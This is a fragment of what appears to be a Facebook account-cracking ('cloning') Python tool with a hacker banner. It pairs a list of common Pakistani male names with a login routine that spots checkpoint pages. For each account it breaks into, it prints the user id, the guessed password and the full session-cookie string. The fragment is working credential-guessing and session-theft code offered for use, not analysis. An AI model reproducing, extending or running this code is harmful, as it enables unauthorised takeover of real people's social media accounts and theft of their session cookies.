...
→   Github            : Jamil king HKR
    Tools             :free
\x1b[1;97m→       Version    :    9.1
4G/3G full speed internet 💔Update Coming Soon
\33[1;37m----------------------------------------------""")

boy = ['Ali khan', 'Haji Khan', 'Faisal Khan', 'Afzal Khan', 'jamilvisal', 'Suleman Khan', 'Lopar Halak', 'Wali ullah', 'Nadeem Khan', 'Nazeer Malik', 'Nazeer Jutt', 'Nazeer Rehmani', 'Safdar Malik', 'Intzar Khan', 'Saleem Malik', 'Abdullah Malik', 'Naseer Jutt', 'Muzammil Malik', 'Fiaz Ahmad', 'Asghar Ali', 'Shabeer Ahmad', 'Irfan Ali', 'Ahmad Gujjar']
                        ...
                        for x in BeautifulSoup(po.text, 'html.parser').find_all('form', {'method': 'post'}):
                            if 'confirmation_event_location=cliff' in str(x):
                                ...
                                if 'checkpoint' in rex.url:
                                    cok = self.ses.cookies.get_dict()
                                    cp.append(email+passw)
                                    print ('\r\033[1;33m[visal-CP] '+cok['c_user']+' | '+passw+'\033[0;97m     ')
                                else:
                                    coki = (";").join([ "%s=%s" % (key, value) for key, value in self.ses.cookies.get_dict().items() ])
                                    cok = self.ses.cookies.get_dict()
                                    print ('\r\033[1;32m[visal-OK] '+cok['c_user']+' | '+passw+' | '+coki+'\033[0;97m     ')
